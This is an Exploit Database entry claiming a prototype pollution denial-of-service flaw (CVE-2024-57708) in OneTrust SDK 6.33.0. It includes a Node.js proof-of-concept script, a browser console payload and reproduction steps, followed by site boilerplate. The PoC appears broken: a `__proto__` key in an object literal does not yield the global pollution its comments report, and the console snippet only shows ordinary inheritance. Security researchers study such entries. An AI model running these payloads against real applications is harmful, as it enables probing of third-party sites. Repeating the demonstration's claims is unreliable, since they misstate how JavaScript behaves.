**Vulnerable App:**

```
- **Exploit Title**: OneTrust SDK 6.33.0 - Denial Of Service (DoS)
- **Date**: 01/01/2025
- **Exploit Author**: Alameen Karim Merali
- **Vendor Homepage**: [OneTrust JavaScript API](https://developer.onetrust.com/onetrust/docs/javascript-api)
- **Software Link**: [otBannerSdk.js v6.33.0](https://discord.com/assets/oneTrust/v4/scripttemplates/6.33.0/otBannerSdk.js)
- **Version**: 6.33.0
- **Tested on**: Kali Linux
- **CVE ID**: CVE-2024-57708

## Vulnerability Summary

A vulnerability exists in **OneTrust SDK v6.33.0** that allows an attacker to perform **Prototype Pollution** via the misuse of `Object.setPrototypeOf` and `Object.assign`. An attacker can inject malicious properties into the prototype chain, potentially causing **Denial of Service (DoS)** or altering the behavior of inherited objects throughout the application.

## Technical Details

The affected code includes prototype assignment logic such as:

```javascript
var o = function(e, t) {
  return (o = Object.setPrototypeOf || { __proto__: [] } instanceof ...);
};
```

If the `t` argument (a user-supplied object) contains a `__proto__` or `constructor.prototype` reference, it can pollute `Object.prototype` globally.

## Proof-of-Concept (PoC)

```javascript
function testPrototypePollution() {
  const maliciousPayload = {
    "__proto__": {
      polluted: "yes"
    }
  };

  // Using vulnerable function 'o'
  try {
    o({}, maliciousPayload);
    console.log("After o:", {}.polluted); // "yes"
  } catch (e) {
    console.error("Error testing o:", e);
  }

  // Using Object.assign
  try {
    Object.assign({}, maliciousPayload);
    console.log("After Object.assign:", {}.polluted); // "yes"
  } catch (e) {
    console.error("Error testing Object.assign:", e);
  }

  // Cleanup
  delete Object.prototype.polluted;
}
testPrototypePollution();
```

## Browser Console PoC (DevTools)

```javascript
var maliciousObj = { __proto__: { hacked: true } };
var newObj = Object.create(maliciousObj);
console.log(newObj.hacked); // true
```

Screenshot: [PoC Screenshot](https://ibb.co/B2hyYr5v)

## Steps to Reproduce

1. Save the PoC script above as `exploit.js`
2. Run using Node.js: `node exploit.js`
3. Observe polluted output (`{}.polluted === "yes"`)
4. Alternatively, run the payload in browser DevTools

## Impact

- Global object pollution
- Application logic errors
- Potential DoS
- Further exploitation depending on context

## Recommendation

Developers should upgrade to a patched version and sanitize any user input used in object merging or prototype manipulation.

##### About The Exploit Database

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, do...
